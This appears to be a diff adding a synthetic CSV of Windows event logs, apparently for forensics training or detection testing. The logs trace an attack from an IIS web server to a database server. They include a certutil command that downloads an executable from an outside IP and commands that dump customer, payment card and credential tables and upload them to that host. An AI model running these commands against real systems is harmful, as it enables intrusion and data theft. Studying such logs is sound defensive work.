@@ -1,0 +1,18 @@
+timestamp,event_id,computer,username,event_type,description
+2025-01-22T14:32:11,4688,WEB-SERVER-01,IIS_AppPool,Process Created,New process. Image: C:\Windows\System32\cmd.exe. Parent: w3wp.exe. CommandLine: cmd.exe /c whoami. PID: 3241
+2025-01-22T14:32:19,4688,WEB-SERVER-01,IIS_AppPool,Process Created,New process. Image: C:\Windows\System32\whoami.exe. Parent: cmd.exe. CommandLine: whoami /all. PID: 3298
+2025-01-22T14:32:41,4688,WEB-SERVER-01,IIS_AppPool,Process Created,New process. Image: C:\Windows\System32\ipconfig.exe. Parent: cmd.exe. CommandLine: ipconfig /all. PID: 3312
+2025-01-22T14:33:05,4688,WEB-SERVER-01,IIS_AppPool,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: cmd.exe. CommandLine: net localgroup administrators. PID: 3341
+2025-01-22T14:33:22,4688,WEB-SERVER-01,IIS_AppPool,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: cmd.exe. CommandLine: net user svc-db. PID: 3367
+2025-01-22T14:34:01,4688,WEB-SERVER-01,IIS_AppPool,Process Created,New process. Image: C:\Windows\System32\netstat.exe. Parent: cmd.exe. CommandLine: netstat -ano. PID: 3398
+2025-01-22T14:34:28,4688,WEB-SERVER-01,IIS_AppPool,Process Created,New process. Image: C:\Windows\System32\ping.exe. Parent: cmd.exe. CommandLine: ping -n 1 172.16.0.20. PID: 3412
+2025-01-22T14:35:47,4688,WEB-SERVER-01,IIS_AppPool,Process Created,New process. Image: C:\Windows\System32\certutil.exe. Parent: cmd.exe. CommandLine: certutil.exe -urlcache -split -f http://91.234.55.12/sqlcli.exe C:\Windows\Temp\sqlcli.exe. PID: 3501
+2025-01-22T14:36:12,4624,DB-SERVER-01,svc-db,Network Logon,Network logon successful. Type 3. Account: svc-db. Source: 172.16.0.10. Authentication: NTLM. Process: sqlcli.exe. Workstation: WEB-SERVER-01
+2025-01-22T14:36:15,4672,DB-SERVER-01,svc-db,Special Privileges Assigned,Privileges assigned. Account: svc-db. Privileges: SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege. Process: sqlcli.exe
+2025-01-22T14:36:24,4688,DB-SERVER-01,svc-db,Process Created,New process. Image: C:\Windows\System32\cmd.exe. Parent: sqlservr.exe. CommandLine: cmd.exe /c osql -S localhost -Q "SELECT TOP 1000 * FROM customers". PID: 2187
+2025-01-22T14:37:04,4688,DB-SERVER-01,svc-db,Process Created,New process. Image: C:\Windows\System32\cmd.exe. Parent: sqlservr.exe. CommandLine: cmd.exe /c osql -S localhost -Q "SELECT * FROM payment_cards". PID: 2211
+2025-01-22T14:37:33,4688,DB-SERVER-01,svc-db,Process Created,New process. Image: C:\Windows\System32\cmd.exe. Parent: sqlservr.exe. CommandLine: cmd.exe /c osql -S localhost -Q "SELECT * FROM user_credentials". PID: 2234
+2025-01-22T14:38:01,4688,DB-SERVER-01,svc-db,Process Created,New process. Image: C:\Windows\System32\bcp.exe. Parent: cmd.exe. CommandLine: bcp retailco.dbo.customers out C:\Windows\Temp\customers_dump.csv -T -c. Data staging: customers_dump.csv prepared for exfiltration. PID: 2301
+2025-01-22T14:38:45,4688,DB-SERVER-01,svc-db,Process Created,New process. Image: C:\Windows\Temp\sqlcli.exe. Parent: cmd.exe. CommandLine: sqlcli.exe --upload C:\Windows\Temp\customers_dump.csv http://91.234.55.12/receive. Data exfiltration: sending customers_dump.csv to 91.234.55.12. PID: 2387
+2025-01-22T14:39:12,4688,DB-SERVER-01,svc-db,Process Created,New process. Image: C:\Windows\System32\bcp.exe. Parent: cmd.exe. CommandLine: bcp retailco.dbo.payment_cards out C:\Windows\Temp\cards_dump.csv -T -c. Data staging: cards_dump.csv prepared for exfiltration. PID: 2421
+2025-01-22T14:39:55,4688,DB-SERVER-01,svc-db,Process Created,New process. Image: C:\Windows\Temp\sqlcli.exe. Parent: cmd.exe. CommandLine: sqlcli.exe --upload C:\Windows\Temp\cards_dump.csv http://91.234.55.12/receive. Data exfiltration: sending cards_dump.csv to 91.234.55.12. PID: 2467
